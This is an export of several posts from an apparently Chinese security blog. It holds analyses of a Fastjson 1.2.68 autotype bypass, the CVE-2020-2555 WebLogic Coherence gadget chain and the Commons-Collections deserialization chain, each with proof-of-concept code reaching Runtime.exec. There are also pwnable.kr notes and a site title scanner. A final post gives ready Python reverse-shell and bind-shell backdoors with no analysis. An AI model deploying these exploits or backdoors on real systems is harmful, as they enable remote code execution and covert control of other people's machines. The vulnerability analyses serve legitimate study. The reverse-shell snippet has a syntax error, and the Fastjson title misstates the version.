[{"title":"Fastjson 1.6.68 autotype bypass","url":"/2020/07/20/fastjson 1.6.68 autotype bypass/","content":"\n## fastjson 漏洞成因\n\n1. Fastjson提供了反序列化功能，允许用户在输入JSON串时通过\"@type\"键对应的value指定任意反序列化类名.\n2. Fastjson自定义的反序列化机制会使用反射生成上述指定类的实例化对象，并自动调用该对象的setter方法及部分getter方法.\n\n## 补丁对比\n\n通过https://github.com/alibaba/fastjson/compare/1.2.68%E2%80%A61.2.69 查看补丁的更新信息可以看到。\n\n在src/main/java/com/alibaba/fastjson/parser/ParserConfig.java中将原明文存储的期望类经自定义消息摘要函数转换为hash值并且新增了几个class对象。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-08-58.png)\n\n这里借用[带头老哥的图](https://xz.aliyun.com/t/7878)\n\n![](/img/media/Fastjson1.68/2020-07-20-14-13-09.png)\n\n可以看到增加了对expectClass类，新增了三个方法分别为java.lang.Runnable、java.lang.Readable、java.lang.AutoCloseable\n\n## AutoType\n\n在Fastjson中存在AutoType这个东西，目的是为了防止进行恶意反序列化对象从而导致的安全问题，如果在没有启用AutoType的情况下默认是只有白名单以及一些基础类型可以被反序列化。在fastjson指定了@type后，主要用checkAutoType方法检测是否开了autotype开关。\n\ncheckAutoType主要对传入的expectClass进行了判断，当safeMode模块没有开启时，如果传入的期望类不null,切不在对比的名单中就会将expectClass的值设置为True。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-39-09.png)\n\n随后将传入的类进入白名单对比看是否存在，如果不存在，也就是类属于黑名单，并且autoType开启或者,expectClassFlag的值被设置成true就将类加入缓存中。\n\n![](/img/media/Fastjson1.68/2020-07-20-14-47-00.png)\n\n随后就是一些判断，并将符合条件的类加入到缓存mapping中，fastjson判断autotype的时候会先对mapping的内容进行判断。\n\n根据代码可知经过autotype校验的情况为：\n\n1、白名单里的类\n2、开启了autotype\n3、使用了jsonType注解\n4、指定了期望的类\n5、缓存中的mapping类\n\n本次漏洞利用的就是指定了期望的类,可以看到如果通过了上面的判断，切指定的期望类不为空，就会将该类添加到缓存mapping中并且返回该类的class。查找反序列化expectClass的子类或实现，如果构造方法或setter中含有其它类型可重复第一步构造一个反序列化链，直到找到可以利用的类为止。\n\n## 漏洞分析\n\n前提说到进过autotype的校验有一种情况是输入的类为缓存中的mapping类。可以看到1.2.69修复后expectClass新加的对比类java.lang.AutoCloseable刚好在名单中。\n\n![](/img/media/Fastjson1.68/2020-07-20-15-43-45.png)\n\n当期望类传入切满足autotype的检测判断后会加入mapping类，然而咋在加入map池的前面对传入的期望类进行了判断。\n\n![](/img/media/Fastjson1.68/2020-07-20-15-48-10.png)\n\n这里我们可以看到isAssignableFrom()这样一个方法，这个方法用于判断里面的类是否为继承类。也就是说如果我们利用了java.lang.AutoCloseable这个方法去攻击fastjson，那么后续反序列化的链路一定是要继承于该类的子类。\n\n这里简单抄了一个payload过来进一步分析。\n\n```\npackage fastjsonRce.Fj68;\n\nimport java.io.IOException;\n\npublic class Test implements AutoCloseable{\n\n    public Test(String cmd){\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void close() throws Exception {\n\n    }\n}\n\n```\n\n加载payload,然后在checkAutoType的入口下断点\n\n```\n{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"fastjsonRce.Fj68.Test\", \"cmd\":\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}\n```\n\n这里可以看到第一次进来解析的类为java.lang.AutoCloseable，由于该类存在与mapping池中，所以期望类为空值。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-01-13.png)\n\n随后将该类进行了反序列化，切该类使用的是JavaBeanDeserializer反序列化器，由于序列化的对象为接口，所以在使用JavaBeanDeserializer会继续解析下一个json字段。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-03-42.png)\n\n可以看到进行了第二次的checkAutoType，并且将java.lang.AutoCloseable作为了其期望类\n\n![](/img/media/Fastjson1.68/2020-07-20-16-09-55.png)\n\n由于新传入的类不在mapping池中，但expectClassFlag的值被设置成了true进入了如下判断。将该类加入到了mapping池中\n\n![](/img/media/Fastjson1.68/2020-07-20-16-16-13.png)\n\n随后进入了expectClass != null的判断。这里的期望类为java.lang.AutoCloseable，因此这也就是之前说的为什么攻击的payload需要继承该类。\n\n随后返回的clazz被赋值为我们的攻击payload Test.class随后使用JavaBeanDeserializer对传入的内容进行了序列化\n\n![](/img/media/Fastjson1.68/2020-07-20-16-23-03.png)\n\n对与该方法的利用还有一个处罚点就是浅蓝师傅最开始说的ThrowableDeserializer，由于该方法是抛出异常时处罚的，切没有开发人员会将执行命令，lookup等方法写到异常处理的地方，因此这个方法不适用于寻找gadget。这里也将主要存在点附上，代码没截全有兴趣的可以自行探索。\n\n![](/img/media/Fastjson1.68/2020-07-20-16-38-21.png)\n\n\n## 总结\n\n对于该反序列化的挖取其方法需要继承java.lang.AutoCloseable、java.lang.Runnable、java.lang.Readable中的一个类，但是其中部分类的使用被做了限制：\n\n![](/img/media/Fastjson1.68/2020-07-20-16-43-18.png)\n\n如果类继承与上面几种接口，则会直接抛出异常。\n\n另外一种思路就是根据[浅蓝师傅的文章](https://b1ue.cn/archives/382.html)去寻找文件读写。\n\n\n","tags":["JAVA"]},{"title":"CVE-2020-2555 反序列化分析","url":"/2020/06/15/CVE-2020-2555 反序列化分析/","content":"\n## 前言\n\n该洞主要是webloigc的coherence.jar存在可以构造反序列化的gadget类，通过T3协议处理后导致漏洞触发，本文主要是学习weblogicT3序列化，并构造利用链的过程。\n\t\n\n## 利用链分析\n\n通过网上公布的poc，得知利用链如下：\n\n```\n gadget:\n      BadAttributeValueExpException.readObject()\n          com.tangosol.util.filter.LimitFilter.toString()\n              com.tangosol.util.extractor.ChainedExtractor.extract()\n               \tcom.tangosol.util.extractor.ReflectionExtractor.extract()\n                     Method.invoke()\n                     ...\n                     Runtime.getRuntime.exec()\n```\n\npoc\n```\nValueExtractor[] valueExtractors = new ValueExtractor[]{\n                new ReflectionExtractor(\"getMethod\", new Object[]{\n                        \"getRuntime\", new Class[0]\n                }),\n                new ReflectionExtractor(\"invoke\", new Object[]{null, new Object[0]}),\n                new ReflectionExtractor(\"exec\", new Object[]{new String[]{command}})\n        };\n\n        //初始化LimitFiler类实例\n        LimitFilter limitFilter = new LimitFilter();\n        limitFilter.setTopAnchor(Runtime.class);\n        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n        Field m_comparator = limitFilter.getClass().getDeclaredField(\"m_comparator\");\n        m_comparator.setAccessible(true);\n        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));\n        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(\"m_oAnchorTop\");\n        m_oAnchorTop.setAccessible(true);\n        m_oAnchorTop.set(limitFilter, Runtime.class);\n        //将limitFilter放入BadAttributeValueExpException的val属性中\n        Field val = expException.getClass().getDeclaredField(\"val\");\n        val.setAccessible(true);\n        val.set(expException, limitFilter);\n```\n\n首先查看ReflectionExtractor.extract()方法：\n\n```\npublic E extract(T oTarget) {\n        if (oTarget == null) {\n            return null;\n        } else {\n            Class clz = oTarget.getClass();\n\n            try {\n                Method method = this.m_methodPrev;\n                if (method == null || method.getDeclaringClass() != clz) {\n                    this.m_methodPrev = method = ClassHelper.findMethod(clz, this.getMethodName(), ClassHelper.getClassArray(this.m_aoParam), false);\n                }\n\n                return method.invoke(oTarget, this.m_aoParam);\n            } catch (NullPointerException var4) {\n                throw new RuntimeException(this.suggestExtractFailureCause(clz));\n            } catch (Exception var5) {\n                throw ensureRuntimeException(var5, clz.getName() + this + '(' + oTarget + ')');\n            }\n        }\n    }\n```\n\n可以看到这里return了一个method.invoke()，进一步构造代码如下。\n\t\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n                reflectionExtractor.extract(runtime);\n```\n\n![image-20200526161740955](/img/media/CVE-2020-2555/image-20200526161740955.png)\n\n可以利用该代码直接弹出cmd，ReflectionExtractor() 这个方法设置了method和invoke的方法。poc最开使得代码类似于CommonsCollections5的transform都是做了一个this.method的赋值。\n\n![image-20200526161010089](/img/media/CVE-2020-2555/image-20200526161010089.png)\n\n\n但是只有触发extract()方法时，该反射调用的最终方法才会被执行。这里根据payload，进一步跟入，查看LimitFilter类的toString()方法\n\n```\npublic String toString() {\n        StringBuilder sb = new StringBuilder(\"LimitFilter: (\");\n        sb.append(this.m_filter).append(\" [pageSize=\").append(this.m_cPageSize).append(\", pageNum=\").append(this.m_nPage);\n        if (this.m_comparator instanceof ValueExtractor) {\n            ValueExtractor extractor = (ValueExtractor)this.m_comparator;\n            sb.append(\", top=\").append(extractor.extract(this.m_oAnchorTop)).append(\", bottom=\").append(extractor.extract(this.m_oAnchorBottom));\n        } else if (this.m_comparator != null) {\n            sb.append(\", comparator=\").append(this.m_comparator);\n        }\n\n        sb.append(\"])\");\n        return sb.toString();\n    }\n```\n\n这里可以看到在LimitFilter的toString()方法中之只要满足判断this.m_comparator的值属于ValueExtractor类就能进行对extract()方法的调用。而reflectionExtractor刚好属于ValueExtractor类\n\n构造测试代码\n\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n//                reflectionExtractor.extract(runtime);\n                LimitFilter limitFilter = new LimitFilter();\n                // 将reflectionExtractor赋值给this.m_comparator\n                limitFilter.setComparator(reflectionExtractor);\n                // 将runtime赋值给this.m_oAnchorTop\n                limitFilter.setTopAnchor(runtime);\n                // 这里相当于调用了ValueExtractor extractor = (ValueExtractor) reflectionExtractor\n                // extractor.extract(runtime)\n                limitFilter.toString();\n```\n\n这里相当于执行了第一个测试代码的reflectionExtractor.extract(runtime);这里整个invoke反射链就完成了，接下来是如何进行readObject的。\n\n这里可以看到这个BadAttributeValueExpException和CommonsCollections5使用的反序列化方法是一样的。\n执行BadAttributeValueException.readObject前，把val赋值为LimitFilter这个类就回调用toString方法，而LimitFilter.toString()刚好形成之前的反射链。\n\n```\nBadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n// 获取私有变量值val\nField val = expException.getClass().getDeclaredField(\"val\");\n// 设置访问标志为true使其可以访问私有变量\nval.setAccessible(true);\nval.set(expException, limitFilter);\n```\n\nBadAttributeValueException的readObject方法\n\n```\nprivate void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {\n        ObjectInputStream.GetField gf = ois.readFields();\n        Object valObj = gf.get(\"val\", null);\n\n        if (valObj == null) {\n            val = null;\n        } else if (valObj instanceof String) {\n            val= valObj;\n        } else if (System.getSecurityManager() == null\n                || valObj instanceof Long\n                || valObj instanceof Integer\n                || valObj instanceof Float\n                || valObj instanceof Double\n                || valObj instanceof Byte\n                || valObj instanceof Short\n                || valObj instanceof Boolean) {\n            val = valObj.toString();\n```\n\n![image-20200526164610226](/img/media/CVE-2020-2555/image-20200526164610226.png)\n\n至此整个反序列化完成\n```\nRuntime runtime = Runtime.getRuntime();\n                ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"exec\",new String[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"});\n//                reflectionExtractor.extract(runtime);\n                LimitFilter limitFilter = new LimitFilter();\n                // 将reflectionExtractor赋值给this.m_comparator\n                limitFilter.setComparator(reflectionExtractor);\n                // 将runtime赋值给this.m_oAnchorTop\n                limitFilter.setTopAnchor(runtime);\n                // 这里相当于调用了ValueExtractor extractor = (ValueExtractor) reflectionExtractor\n                // extractor.extract(runtime)\n//                limitFilter.toString();\n                BadAttributeValueExpException expException = new BadAttributeValueExpException(null);\n                // 获取私有变量值val\n                Field val = expException.getClass().getDeclaredField(\"val\");\n                // 设置访问标志为true使其可以访问私有变量\n                val.setAccessible(true);\n                val.set(expException, limitFilter);\n```\n\n使用此条链会出现如下报错是因为Runtime这个类没实现序列化接口。原理已经搞清楚了修改一下poc就可以利用了。\n\n![image-20200526170031346](/img/media/CVE-2020-2555/image-20200526170031346.png)","tags":["JAVA"]},{"title":"JAVA反序列化分析之Apache-Commons-Collections","url":"/2019/07/17/JAVA反序列化分析之Apache-Commons-Collections/","content":"\n## Transformer\n\n该类里的transform方法将一个对象转化为另一个对象.如Runtime.class经过transform转化输出结果为class java.lang.Class\n\n![Pasted Graphi](/img/media/Apache-Commons-Collections/Pasted%20Graphic.png)\n\n## InvokerTransformer\n\n通过查看InvokerTransformer的源码可以看出该类是通过反射创建一个新的对象实例.该类使用了transform接口如图所示：\n![Pasted Graphic 1](/img/media/Apache-Commons-Collections/Pasted%20Graphic%201.png)\n\ncls获取传递进来的input对象值，例如传入runtime对象\n\ncls.getMethod   以及method.invoke是利用java反射机制反射Runtime的getRuntime方法。\n\niMethodName表示得到的方法名， iParamTypes表示方法中使用的参数类型的数组\n![Pasted Graphic 2](/img/media/Apache-Commons-Collections/Pasted%20Graphic%202.png)\n\n通过InvokerTransformer反射出了java.lang.Runtime.getRuntime()\n![Pasted Graphic 3](/img/media/Apache-Commons-Collections/Pasted%20Graphic%203.png)\n\n执行命令的整个调用连为 java.lang.Runtime..getRuntime().invoke().exec()\n可以通过该方式逐步调用：\n![Pasted Graphic 4](/img/media/Apache-Commons-Collections/Pasted%20Graphic%204.png)\n\n成功代码执行\n![Pasted Graphic 5](/img/media/Apache-Commons-Collections/Pasted%20Graphic%205.png)\n\n上述是整个反射链的过程\n\n## ChainedTransformer\n![Pasted Graphic 6](/img/media/Apache-Commons-Collections/Pasted%20Graphic%206.png)\n\n可以看出该类重构了transform方法，将我们之前的调用链简化到一个方法中通过创建的Transformers数组循环反射执行。\n\n如何构造出Runtime对象类型呢？\n\n## ConstantTransformer\n![Pasted Graphic 7](/img/media/Apache-Commons-Collections/Pasted%20Graphic%207.png)\n\n可以看出该类对transformer重构，返回一个iConstant变量，该变量在ConstantTransformer(Object)方法中被赋值。\n![Pasted Graphic 8](/img/media/Apache-Commons-Collections/Pasted%20Graphic%208.png)\n![Pasted Graphic 9](/img/media/Apache-Commons-Collections/Pasted%20Graphic%209.png)\n\n内部构造出了Runtime的对象类型\n\n构造poc\n![Pasted Graphic 10](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2010.png)\n\n成功执行\n![Pasted Graphic 11](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2011.png)\n\n## TransformedMap\n\n该类实现了一个功能——将普通的Map转换为一个TransformedMap，可以通过该类绕过transform方法。\n![Pasted Graphic 12](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2012.png)\n\nKeyTransfomer 表示key改变的操作  valueTransformer表示value改变时的操作\n![Pasted Graphic 13](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2013.png)\n\n从这里可以看出 value是可控的，在decorate中赋值即可，于是有如下利用代码：\n![Pasted Graphic 14](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2014.png)\n\n通过TransformedMap代替transform生成如下代码：\n![Pasted Graphic 15](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2015.png)\n\n成功弹出计算器：\n![Pasted Graphic 16](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2016.png)\n\n至此我们获取了一个完整的poc，剩下需要找一个可重写readObject方法的类并且调用了对map值进行修改操作。\n\n在ysoserial反序列化工具利用的是 BadAttributeValueExpException 查看代码如下：\n![Pasted Graphic 19](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2019.png)\n\n该代码重构了readObject方法，如果传入类型为map类型，则会调用map.toString()方法。这里并没有对map的key值进行修改操作，于是需要利用LazyMap,TiedMapEntry两个类来构造\nLazyMap：尝试访问key的value如果key不在会把值put进去\n![Pasted Graphic 20](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2020.png)\n\nTiedMapEntry：会把map和一个key进行绑定\n![Pasted Graphic 21](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2021.png)\n\n利用LazyMap创建map对象，通过decotate方法设transfomer时的transformChain然后通过TiedMapEntry将map与不存在的key绑定，进而利用BadAttributeValueExpException创建一个map进行赋值。但是val是私有属性的，需要进行setAccessible(true)来访问私有变量。\n\n至此完成整个exp编写：\n![Pasted Graphic 22](/img/media/Apache-Commons-Collections/Pasted%20Graphic%2022.png)\n\n## 参考链接\n\nhttps://security.tencent.com/index.php/blog/msg/97\n\nhttps://www.freebuf.com/news/150872.html\n\nhttp://pupiles.com/java_unserialize2.html","tags":["JAVA"]},{"title":"Title批量获取工具","url":"/2019/04/20/Title批量获取工具/","content":"\n## 批量快速获取Title、server信息工具\n\n使用方法：将需要获取的网站链接列表保存在工具目录下的1.txt中，运行脚本。此脚本会时时输出在控制台中，运行完毕后所有信息全部输入到本地生成的output.xls文件中。如果有建议可以评论提交本人修改。\n\n```\n'''\ntitle快速获取工具  \n保存需要获取的ip到本地txt文件直接运行即可\n'''\nimport requests\nimport threading\nimport re, xlwt, random\n\n#proxies = {'http': 'http://127.0.0.1:8080'}\nThreadList = []   # 线程列表\nrunList = []      # 运行线程列表\nFileList = []     # 网站链接列表\nOutList = []      # 输出数据列表\nlock = threading.Lock()\n\n# 随机agent\ndef requests_headers():\n    user_agent = [\n        'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',\n        'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',\n        'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',\n        'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',\n        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',\n        'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5'\n    ]\n    UA = random.choice(user_agent)\n    headers = {\n        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',\n        'User-Agent':UA,\n        'Upgrade-Insecure-Requests':'1',\n        'Connection':'keep-alive',\n        'Cache-Control':'max-age=0',\n        'Accept-Encoding':'gzip, deflate, sdch',\n        'Accept-Language':'zh-CN,zh;q=0.8',\n        \"Referer\": \"http://www.baidu.com/link?url=www.so.com&url=www.soso.com&&url=www.sogou.com\"\n    }\n    return headers\n\n# 多线程获取页面信息\nclass MyThread(threading.Thread):\n    def __init__(self, ip):\n        threading.Thread.__init__(self)\n        self.ip = ip\n\n    def run(self):\n        if self.ip[0:4] != 'http':\n            self.ip = 'http://' + self.ip\n        try:\n            headers = requests_headers()\n            r = requests.get(url=self.ip, headers=headers ,timeout=5, proxies=False)\n            if r.text.find('charset=utf-8') >= 0:\n                r.encoding = 'utf-8'\n            title = re.findall(r'<title>(.*?)</title>', r.text)[0]\n            lock.acquire(timeout=1)\n            print([self.ip,title,r.headers['Server']])\n            OutList.append([self.ip, title ,r.headers['Server']])\n            lock.release()       \n        except:\n            pass\n\n\ndef OpenFile():\n    f = open('1.txt','r')\n    for i in f.readlines():\n        FileList.append(i.strip())\n    f.close()\n    GetInfo(FileList)\n\ndef GetInfo(FileList):\n    taskNum = 0\n    for i in FileList:\n        t = MyThread(i)\n        ThreadList.append(t)\n    for t in ThreadList:\n        t.setDaemon(True)\n        t.start()\n        runList.append(t)\n        taskNum += 1\n        while taskNum > 19:\n            for t in runList:\n                if t.isAlive() == False:\n                    runList.remove(t)\n                    taskNum -= 1\n    OutPut(OutList)\n\ndef OutPut(OutList):\n    workbook = xlwt.Workbook(encoding='utf-8')\n    worksheet = workbook.add_sheet('result')\n    for i in range(0,3):\n        worksheet.col(i).width = 10000\n    worksheet.write(0,0, label='网站链接')\n    worksheet.write(0,1, label='网站标题')\n    worksheet.write(0,2, label='Server信息')\n    #worksheet.write(0,3, label='Web指纹')\n    for i in range(1,len(OutList)):\n        output = OutList[i]\n        worksheet.write(i,0, label=output[0])\n        worksheet.write(i,1, label=output[1])\n        worksheet.write(i,2, label=output[2])\n    workbook.save('output.xls')\n\ndef main():\n    OpenFile()\n\nif \"__main__\" == __name__:\n    main()\n\n```","tags":["安全工具"]},{"title":"pwable.rk题目相关知识(不定期更新)","url":"/2019/04/01/pwable-rk题目相关知识不定期更新/","content":"\n## Fd\n\n1、标准输入输出和错误\n\nlinux下使用标准输入文件stdin和标准输出文件stdout，来表示每个命令的输入和输出，还使用标准错误输出文件stderr用于输出错误信息。三个标准流都与系统与控制终端设备相连(如:键盘)。\n\n因此，在标准情况下，每个命令通常从相应的控制终端中获取输入，并将输出打印到控制终端屏幕上，如本题解题过程。也可以将程序重新定义，将stdin，stdout重定向。最基本的使用方法是定义到一个文件上，从一个文件获取输入，输出到另外的文件中。如read()，write()函数的使用。\n\n2、文件描述符\n\n在底层操作系统是不会通过文件指针来查找文件的，而是通过文件表示符来操作的。\n\n文件标识符以一系列证书，从0开始依次递增。但是一般系统标识符都是从3开始的。\n\n文件描述符0、1、2和终端相关。如果希望命令从文件中读取输入或输出到文件中，就需要使用文件重定向。\n\n系统默认打开三个流：\n\n| 文件描述符| 缩写 | 描述 |\n| :-: | :-: | :-: |\n| 0 | stdin | 标准输入(命令的输入，缺省和终端键盘关联) |\n| 1 | stdout | 标准输出(命令的输出，缺省和终端屏幕关联) |\n| 2 | stderr | 标准错误输出(命令的错误信息输出，缺省和终端屏幕关联) |\n\n3、重定向标准输出\n\n```\nwhoami > filename  #把命令标准输出重定向到一个文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令标准输出重定向到文件中(尾部追加)\n```\n\n4、重定向标准输入\n\n```\nwhoami < filename  # 以filename文件作为命令whoami的标准输入\nwhoami << DELIMITER # 从标准输入中读入输入，直到遇到DELIMITER分解符\n```\n\n5、重定向标准错误\n\n```\nwhoami 2> filename # 把whoami命令的标准错误重定向到文件中(如果文件存在，则内容覆盖)\nwhoami >> filename # 把命令的标准错误重定向到文件中(尾部追加)\n```\n\n## collision\n\n1、\\xc9 为字符串。使用python print后会输出？是因为计算机不识别的这个字符\n\n2、大端序 or 小端序\n    端序：又称字节序、尾序、位序。在计算机领域是指机器存放多字节数据的字节顺序。在涉及到低层数据存储和网络数据传输研究中都会涉及端序。\n    大端序：高位字节放在内存的低地址，低位字节放在内存的高地址。\n    小端序：低位字节放在内存的低地址，高位字节放在内存的高地址。\n    例：int a = 0x12345678  从左到右字节位降低 两个数为一个字节 12是高位78是低位，字节位具有相对性。\n```\n    大端序存放方式：\n    0x00000001           -- 12\n    0x00000002           -- 34\n    0x00000003           -- 56\n    0x00000004           -- 78 \n    地址位从低到高，字节位从高到低\n    小端序存放方式：\n    0x00000001           -- 78\n    0x00000002           -- 56\n    0x00000003           -- 34\n    0x00000004           -- 12 \n    地址位从低到高，字节位从低到高\n```\n\n3、lsb文件基本都是小端序文件\n\n## bof\n\n1、gets(s)存在溢出\n    scanf遇到输出不能有空格，所以用gets输入字符串，但是gets出现了一个潜在问题，gets将不停地往s中塞东西，不管s的可用空间是否足够，就存在溢出漏洞问题，超过s空间长度会导致系统崩溃。\n\n2、esp汇编中为栈顶置针，栈中数据都是从栈顶进入的。\n\n| 栈顶 |\n| --- |\n| esp |\n| ... |\n| s |\n| ... |\n| ebp |\n| 返回地址 |\n| arg0 | \n\nesp = s + ebp(4字节) + 返回地址(4)\n\n\n## flag\n\nupx压缩文件\n```\nupx -d file  #upx解压文件\n```\n\n## passcode\n\n1、scanf(\"%d\", &a)\nscanf函数会把获取的值送到一个地址，如果不加&会把a的值当作地址传送。\n\n\n待更新...\n","tags":["pwn"]},{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n1. windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n2. linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]}]